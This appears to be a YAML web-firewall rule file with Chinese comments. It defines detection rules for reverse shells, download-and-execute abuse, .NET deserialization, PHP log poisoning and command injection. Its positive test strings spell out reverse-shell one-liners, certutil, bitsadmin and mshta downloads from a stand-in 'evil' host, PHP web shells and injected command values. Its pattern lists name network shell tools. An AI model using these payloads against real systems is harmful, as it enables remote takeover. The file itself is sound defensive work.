  # 这一条是**从 6004/6005 里"挑出来单独拦"的那部分**。
  #
  # 为什么拆：那两条把"攻击专用形态"和"运维文档里天天出现的双用途串"混在一起 ——
  # `chmod 777`、`systemctl enable`、`authorized_keys`、`openssl s_client -connect`、
  # `nc -lvp`、`python -c`、`ipconfig /all`、`tasklist /v` 这些出现在帮助台工单、
  # 运维文档、配置表单里的概率很高。整条提到 5 分（单独就拦）等于拿误报换覆盖。
  #
  # 所以按"出现即攻击"来分：
  #   - 这条（6013，5 分）：反弹 shell 与下载执行的**专用命令行形态**，
  #     正常业务输入里不会出现，出现即拦；
  #   - 6004/6005（4 分）：双用途形态，只记分、与其它信号叠加。
  # 重叠的串两条都会命中（5 + 4），总分更高但拦不拦的结论不变。
  - id: RCE-6013
    phase: 2
    severity: critical
    category: rce
    score: 5
    message: "命令执行特征：反弹 shell / 下载执行专用形态"
    tags: [rce, owasp-a03, reverse-shell, download-exec]
    targets:
      - collection: ARGS
      - collection: REQUEST_BODY
      - collection: REQUEST_COOKIES
      - collection: REQUEST_URI
      - collection: REQUEST_HEADERS
    transforms:
      - urlDecode
      - urlDecode
      - normalizeIFS
      - removeShellQuotes
      - compressWhitespace
      - lowercase
      - normalizePath
    operator:
      name: pm
      params:
        patterns:
          # 反弹 shell
          - "/dev/tcp/"
          - "bash -i >&"
          - "sh -i >&"
          - "nc -e /bin"
          - "ncat -e /bin"
          - "mkfifo /tmp"
          - "socat tcp-connect"
          - "socat exec:"
          - "base64 -d | sh"
          - "base64 --decode | sh"
          # 下载执行（系统自带工具的滥用）
          - "certutil -urlcache"
          - "certutil -decode"
          - "bitsadmin /transfer"
          - "mshta http"
          - "mshta javascript"
          - "rundll32 javascript"
          - "wmic process call create"
          - "powershell -enc"
          - "powershell -e "
    test:
      positive:
        - "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
        - "nc -e /bin/sh 10.0.0.1 4444"
        - "mkfifo /tmp/f; /bin/sh -i < /tmp/f"
        - "echo cHduZWQ= | base64 -d | sh"
        - "certutil -urlcache -f http://evil/x.exe y.exe"
        - "bitsadmin //transfer http://evil/x y.exe"
        - "mshta http://evil/x.hta"
        - "powershell -enc SQBFAFgA"
        - "socat tcp-connect:10.0.0.1:4444 exec:/bin/sh"
      negative:
        # 双用途的运维文本不该被这条拦（它们仍由 6004/6005 记分）
        - "run chmod 777 on the uploads directory"
        - "systemctl enable nginx after the upgrade"
        - "append your key to ~/.ssh/authorized_keys"
        - "openssl s_client -connect example.com:443"
        - "python -c 'print(1)' in a venv"
        - "ipconfig /all shows the adapter list"

  # .NET 反序列化：请求里出现这些基类型名或 BinaryFormatter 魔数的 base64 头，
  # 基本只可能是 ysoserial.net 打过来的 —— 出现即攻击。
  - id: RCE-6014
    phase: 2
    severity: critical
    category: rce
    score: 5
    message: "代码执行特征：.NET 反序列化载荷"
    tags: [rce, deserialization, dotnet]
    targets:
      - collection: ARGS
      - collection: REQUEST_BODY
      - collection: REQUEST_URI
      - collection: REQUEST_COOKIES
    transforms:
      - urlDecode
      - urlDecode
      - normalizeIFS
      - removeShellQuotes
      - lowercase
    operator:
      name: pm
      params:
        patterns:
          # BinaryFormatter 序列化魔数（00 01 00 00 00 FF FF FF FF）的 base64 头
          - "aaeaaad"
          - "objectstateformatter"
          - "losformatter"
          - "typeconfusedelegate"
          - "textformattingrunproperties"
          - "system.web.ui.objectstateformatter"
          - "binaryformatter"
          - "system.runtime.serialization"
    test:
      positive:
        - "AAEAAAD/////AQAAAAAAAAAMAgAAAFRTeXN0ZW0uV2luZG93cy5Gb3JtcywgVmVyc2lvbj00LjAuMC4w"
        - "ObjectStateFormatter"
        - "TypeConfuseDelegate"
        - "TextFormattingRunProperties"
      negative:
        - "the serializer handles JSON payloads"
        - "please format the output as JSON"
        - "our .NET service runs on Windows"

  # 结构判定：**不依赖命令词表** —— 分隔符后面跟一个词，再跟路径或选项，
  # 这种"命令 + 参数"的形状在正常业务输入里几乎不出现。
  # 定位是兜底：词表里的命令由 6001/6003 直接拦（5 分），表外的走这条记分，
  # 与 LFI/RCE 的其它信号叠加后过阈值。触发这条规则的实测样本：
  # "它是在枚举命令名，而不是判'这里有个命令'" —— 这条就是那个判据。
  - id: RCE-6017
    phase: 2
    severity: high
    category: rce
    score: 4
    message: "命令注入迹象：分隔符后出现命令与参数的形状（不看命令名）"
    tags: [rce, owasp-a03, cmdi, structural]
    targets:
      - collection: ARGS
      - collection: REQUEST_BODY
      - collection: REQUEST_URI
      - collection: REQUEST_HEADERS
      - collection: REQUEST_COOKIES
    transforms:
      - urlDecode
      - urlDecode
      - normalizeIFS
      - compressWhitespace
      - lowercase
    operator:
      name: regex
      params:
        pattern: '[;&|]{1,2}[\s+]*[a-z0-9_][a-z0-9_.\-]{0,24}[\s+]+(?:-{1,2}[a-z]|/|\.\./|\$\()'
    test:
      positive:
        - ";mytool -x /tmp/a"
        - "|somebin /etc/passwd"
        - ";custom-tool --exec"
      negative:
        - "Cats; dogs and birds"
        - "the total is 3; select the option"
        - "Separator: A | B | C"

  - id: RCE-6012
    phase: 2
    severity: high
    category: rce
    score: 5
    message: "脚本代码出现在请求头/参数/路径里（日志投毒与代码注入特征）"
    tags: [rce, log-poisoning, code-execution]
    # 为什么单独一条规则、而且要看请求头：
    # 「把 PHP 写进 User-Agent/Referer/URL，等应用把访问日志 include 进来」是
    # 日志投毒到 RCE 的经典链路，而它的第一跳**只出现在请求元数据里**。
    # RCE-6007 只覆盖 ARGS 与请求体，UA/Referer/Cookie/路径一个都不看，
    # 于是这条链的第一跳可以从旁边走过去。这里补上那几个集合。
    #
    # 打分 5（强信号）：正常流量不会在请求头里出现 `<?php`、`eval($_`、`$_POST[`。
    targets:
      - collection: REQUEST_HEADERS
      - collection: REQUEST_COOKIES
      - collection: ARGS
      - collection: REQUEST_PATH
    transforms:
      - urlDecode
      - urlDecode
      - compressWhitespace
      - lowercase
    operator:
      name: pm
      params:
        patterns:
          - "<?php"
          - "<?="
          - "<%@"
          - "eval($_"
          - "assert($_"
          - "system($_"
          - "passthru($_"
          - "shell_exec($_"
          - "base64_decode($_"
          - "$_post["
          - "$_get["
          - "$_request["
          - "$_server["
    test:
      positive:
        - "<?php system($_GET['cmd']); ?>"
        - "<?=phpinfo();?>"
        - "eval($_POST['a']);"
        - "<%@ page import=\"java.util.*\" %>"
        - "<?php @eval($_POST[cmd]);?>"
      negative:
        - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
        - "https://example.com/landing?utm_source=newsletter"
        - "session=8f2b1c9d; theme=dark; lang=zh-CN"
        - "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif"
        - "gzip, deflate, br"

  - id: RCE-6018
    phase: 2
    severity: high
    category: rce
    score: 5
    message: "命令注入特征：IP/主机形参数值后跟 shell 分隔符与命令词"
    tags: [rce, owasp-a03, structural]
    targets:
      - collection: ARGS
      - collection: REQUEST_BODY
      - collection: REQUEST_URI
    transforms:
      - urlDecode
      - urlDecode
      - normalizeIFS
      - expandShellVars
      - compressWhitespace
      - lowercase
    operator:
      name: regex
      params:
        pattern: "(?:[0-9]{1,3}\\.){3}[0-9]{1,3}[ \\t+]*[;&|]{1,2}[ \\t+]*[a-z]"
    test:
      positive:
        - "127.0.0.1;arch"
        - "127.0.0.1;nproc"
        - "127.0.0.1;getconf LONG_BIT"
        - "10.0.0.1 | hostid"
      negative:
        - "10.0.0.1;10.0.0.2"
        - "192.168.1.1 | 255.255.255.0"
        - "resolver=8.8.8.8,1.1.1.1"
